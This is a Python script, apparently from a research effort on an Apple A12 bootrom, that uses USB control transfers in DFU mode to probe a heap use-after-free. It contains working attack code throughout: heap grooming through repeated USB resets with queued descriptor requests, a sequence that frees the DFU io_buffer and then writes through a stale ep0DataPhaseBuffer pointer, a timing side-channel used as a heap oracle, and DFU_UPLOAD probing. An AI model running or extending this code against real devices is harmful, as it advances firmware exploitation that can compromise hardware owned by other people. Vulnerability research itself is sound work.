#!/usr/bin/env python3
"""
A12 Heap Perturbation Oracle
==============================
Since DFU_UPLOAD doesn't work and no descriptors are mod64,
we need another way to observe heap changes.

Strategy: Use TIMING as an oracle.
  - After heap grooming, DFU operations may take different amounts of time
    because the heap allocator traverses free lists that have been modified
  - If we can detect a timing difference between "clean" and "groomed" heap,
    that proves heap perturbation even without reading memory

Also test: DFU_DNLOAD with carefully chosen sizes
  - DFU_DNLOAD of exactly 0x40 (64) bytes → if the callback sees io_length=64,
    and 64 % 64 == 0, AND wLength > 64... ZLP trigger!
  - The question: does the DFU DNLOAD handler use standard_device_request_cb?
  
And test: Repeated DNLOAD/ABORT cycles to trigger UAF conditions.
"""
import sys, time, struct, json, statistics
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID = 0x1227

def get_backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def connect(timeout_s=10):
    for _ in range(timeout_s * 2):
        dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend())
        if dev:
            try: dev.set_configuration()
            except: pass
            return dev
        time.sleep(0.5)
    return None

def get_status(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4], "poll_ms": r[1]|(r[2]<<8)|(r[3]<<16)}
    except:
        return None

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)

def reset_to_idle(dev):
    for _ in range(10):
        st = get_status(dev)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10:
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
        else:
            try: dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
            except: return False
        time.sleep(0.1)
    return False

def measure_dnload_timing(dev, size, count=10):
    """Measure how long DFU_DNLOAD takes for a given size. Returns list of times in us."""
    times = []
    for i in range(count):
        # Reset to idle first
        st = get_status(dev)
        if st and st["bState"] != 2:
            if st["bState"] == 10:
                dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
                time.sleep(0.05)
            elif st["bState"] == 5:
                try:
                    dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
                except:
                    return times  # Device disconnected
                time.sleep(0.1)
                dev2 = connect(5)
                if dev2:
                    dev = dev2
                else:
                    return times
        
        payload = bytes([0x41 + (i % 26)] * size)
        t0 = time.perf_counter_ns()
        try:
            dev.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=5000)
            t1 = time.perf_counter_ns()
            times.append((t1 - t0) / 1000)  # Convert to microseconds
        except Exception as e:
            log(f"    DNLOAD err at iter {i}: {e}")
            break
    return times

def test_timing_oracle():
    """
    Compare DNLOAD timing BEFORE and AFTER heap grooming.
    If the heap is perturbed, malloc() traverses a different free list → timing difference.
    """
    log("=" * 60)
    log("TEST 1: TIMING ORACLE")
    log("=" * 60)
    
    dev = connect()
    if not dev:
        log("No device!")
        return
    
    # Baseline: measure DNLOAD timing on clean heap
    log("\n--- Baseline (clean heap) ---")
    reset_to_idle(dev)
    
    baseline_times = []
    for size in [64, 256, 512, 2048]:
        dev2 = connect()
        if not dev2:
            break
        reset_to_idle(dev2)
        times = measure_dnload_timing(dev2, size, count=5)
        if times:
            avg = statistics.mean(times)
            std = statistics.stdev(times) if len(times) > 1 else 0
            log(f"  DNLOAD {size:4d}B: avg={avg:.0f}us, std={std:.0f}us, samples={len(times)}")
            baseline_times.append({"size": size, "avg": avg, "std": std, "times": times})
    
    # Groom: Send many USB resets with pending requests
    log("\n--- Heap Grooming (USB RESET cycles) ---")
    dev = connect()
    if not dev:
        log("Lost device!")
        return
    
    for cycle in range(5):
        # DNLOAD to put something on the heap
        st = get_status(dev)
        if st and st["bState"] == 2:
            try:
                dev.ctrl_transfer(0x21, 1, 0, 0, bytes(0x800), timeout=5000)
            except:
                pass
        
        # Send descriptor requests to queue io_requests
        for _ in range(20):
            try:
                dev.ctrl_transfer(0x80, 6, 0x0100, 0, 0x40, timeout=100)
            except:
                pass
        
        # USB RESET 
        try:
            dev.reset()
        except:
            pass
        time.sleep(1)
        dev = connect(5)
        if not dev:
            log(f"  Cycle {cycle}: lost device!")
            time.sleep(3)
            dev = connect(10)
            if not dev:
                return
        else:
            log(f"  Cycle {cycle}: OK")
    
    # Post-groom: measure DNLOAD timing
    log("\n--- Post-Groom Timing ---")
    
    # DFU_ABORT to re-enter DFU with new heap state
    try:
        dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
    except:
        pass
    time.sleep(3)
    dev = connect(10)
    if not dev:
        log("Lost device after abort!")
        return
    
    postgroom_times = []
    for size in [64, 256, 512, 2048]:
        dev2 = connect()
        if not dev2:
            break
        reset_to_idle(dev2)
        times = measure_dnload_timing(dev2, size, count=5)
        if times:
            avg = statistics.mean(times)
            std = statistics.stdev(times) if len(times) > 1 else 0
            log(f"  DNLOAD {size:4d}B: avg={avg:.0f}us, std={std:.0f}us, samples={len(times)}")
            postgroom_times.append({"size": size, "avg": avg, "std": std, "times": times})
    
    # Compare
    log("\n--- COMPARISON ---")
    for b, p in zip(baseline_times, postgroom_times):
        diff = p["avg"] - b["avg"]
        pct = (diff / b["avg"]) * 100 if b["avg"] > 0 else 0
        marker = " *** SIGNIFICANT" if abs(pct) > 10 else ""
        log(f"  {b['size']:4d}B: baseline={b['avg']:.0f}us, groomed={p['avg']:.0f}us, diff={diff:+.0f}us ({pct:+.1f}%){marker}")
    
    return {"baseline": baseline_times, "postgroom": postgroom_times}

def test_uaf_crash_oracle():
    """
    Test 2: Try to trigger UAF and see if device crashes/behaves differently.
    
    Sequence:
    1. DFU_DNLOAD 0x800 bytes → sets ep0DataPhaseBuffer to io_buffer
    2. 5 USB RESET cycles with pending requests (attempt heap grooming)
    3. DFU_ABORT → frees io_buffer, DFU re-enters
    4. Now ep0DataPhaseBuffer is STALE (points to freed memory)
    5. Send data that gets written to the stale pointer
    6. Observe: crash? error? different behavior?
    """
    log("\n" + "=" * 60)
    log("TEST 2: UAF CRASH ORACLE")
    log("=" * 60)
    
    dev = connect()
    if not dev:
        log("No device!")
        return
    
    st = get_status(dev)
    log(f"Initial: {st}")
    
    if st and st["bState"] != 2:
        reset_to_idle(dev)
    
    # Step 1: DNLOAD to set ep0DataPhaseBuffer
    log("Step 1: DNLOAD 0x800 (sets ep0DataPhaseBuffer)")
    try:
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes([0xCC] * 0x800), timeout=5000)
        st = get_status(dev)
        log(f"  State: {st}")
    except Exception as e:
        log(f"  Error: {e}")
        return
    
    # Step 2: Multiple USB RESET cycles to groom heap
    log("Step 2: Heap grooming (3 USB RESET cycles)")
    for cycle in range(3):
        # Queue requests
        for _ in range(30):
            try:
                dev.ctrl_transfer(0x80, 6, 0x0100, 0, 0x40, timeout=50)
            except:
                pass
        
        try:
            dev.reset()
        except:
            pass
        time.sleep(1.5)
        dev = connect(5)
        if dev:
            log(f"  Cycle {cycle}: reconnected")
        else:
            log(f"  Cycle {cycle}: lost!")
            time.sleep(3)
            dev = connect(10)
            if not dev:
                return
    
    # Step 3: One more DNLOAD to refresh the stale pointer setup
    log("Step 3: Second DNLOAD (reinforcing stale pointer)")
    try:
        # This DNLOAD writes 0x800 bytes of 0xDD
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes([0xDD] * 0x800), timeout=5000)
        st = get_status(dev)
        log(f"  State after 2nd DNLOAD: {st}")
    except Exception as e:
        log(f"  Error: {e}")
    
    # Step 4: DFU_ABORT → frees io_buffer, DFU re-enters
    log("Step 4: DFU_ABORT (frees io_buffer, triggers re-entry)")
    try:
        dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
        log("  ABORT sent")
    except:
        log("  ABORT caused disconnect (expected)")
    
    time.sleep(3)
    dev = connect(10)
    if not dev:
        log("  Waiting longer for DFU re-entry...")
        time.sleep(5)
        dev = connect(10)
    
    if not dev:
        log("DEVICE DID NOT RE-ENTER DFU!")
        log(">>> This could indicate a CRASH from heap corruption! <<<")
        return {"result": "no_reentry", "interpretation": "possible_crash"}
    
    st = get_status(dev)
    log(f"  After re-entry: {st}")
    
    # Step 5: Now try DNLOAD — if ep0DataPhaseBuffer was stale,
    # the new DFU handler might have corrupted heap
    log("Step 5: Post-UAF DNLOAD test")
    try:
        t0 = time.perf_counter_ns()
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes([0xEE] * 256), timeout=5000)
        t1 = time.perf_counter_ns()
        elapsed_us = (t1 - t0) / 1000
        st = get_status(dev)
        log(f"  DNLOAD OK in {elapsed_us:.0f}us, state={st}")
    except Exception as e:
        log(f"  DNLOAD ERROR: {e}")
        log(">>> Post-UAF DNLOAD failed — possible heap corruption! <<<")
        return {"result": "dnload_error", "error": str(e)}
    
    # Step 6: Try GET_DESCRIPTOR to verify device is still healthy
    log("Step 6: Health check")
    try:
        r = dev.ctrl_transfer(0x80, 6, 0x0100, 0, 18, timeout=2000)
        log(f"  Device descriptor: {len(r)} bytes — device healthy")
    except Exception as e:
        log(f"  Health check FAILED: {e}")
        return {"result": "unhealthy", "error": str(e)}
    
    log("  Device survived UAF sequence without crash")
    return {"result": "survived", "interpretation": "heap_not_perturbed_or_same_address"}

def test_upload_thorough():
    """Test DFU_UPLOAD more thoroughly — try different states and sizes."""
    log("\n" + "=" * 60)
    log("TEST 3: DFU_UPLOAD EXPLORATION")
    log("=" * 60)
    
    dev = connect()
    if not dev:
        log("No device!")
        return
    
    reset_to_idle(dev)
    
    # Test UPLOAD from dfuIDLE
    log("UPLOAD from dfuIDLE:")
    for size in [6, 18, 64, 256, 512]:
        try:
            t0 = time.perf_counter_ns()
            data = dev.ctrl_transfer(0xA1, 2, 0, 0, size, timeout=1000)
            t1 = time.perf_counter_ns()
            elapsed = (t1 - t0) / 1000
            log(f"  wLength={size}: got {len(data)} bytes in {elapsed:.0f}us — {data[:16].hex()}")
        except usb.core.USBTimeoutError:
            log(f"  wLength={size}: TIMEOUT")
        except Exception as e:
            log(f"  wLength={size}: {e}")
    
    # DNLOAD first, then try UPLOAD from dfuDNLOAD-IDLE
    log("\nUPLOAD from dfuDNLOAD-IDLE:")
    try:
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes([0xFF] * 64), timeout=5000)
        time.sleep(0.1)
    except:
        pass
    
    for size in [6, 18, 64, 256]:
        try:
            data = dev.ctrl_transfer(0xA1, 2, 0, 0, size, timeout=1000)
            log(f"  wLength={size}: got {len(data)} bytes — {data[:16].hex()}")
        except usb.core.USBTimeoutError:
            log(f"  wLength={size}: TIMEOUT")
        except Exception as e:
            log(f"  wLength={size}: {e}")

if __name__ == "__main__":
    results = {}
    
    # Test 1: Timing oracle
    r1 = test_timing_oracle()
    if r1:
        results["timing"] = r1
    
    # Re-enter DFU
    time.sleep(3)
    
    # Test 2: UAF crash oracle
    r2 = test_uaf_crash_oracle()
    if r2:
        results["uaf_crash"] = r2
    
    # Re-enter DFU
    time.sleep(3)
    
    # Test 3: DFU_UPLOAD exploration
    test_upload_thorough()
    
    # Save results
    out = Path(__file__).parent / "results" / "heap_oracle_test.json"
    with open(out, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": results}, f, indent=2, default=str)
    log(f"\nResults saved to {out}")
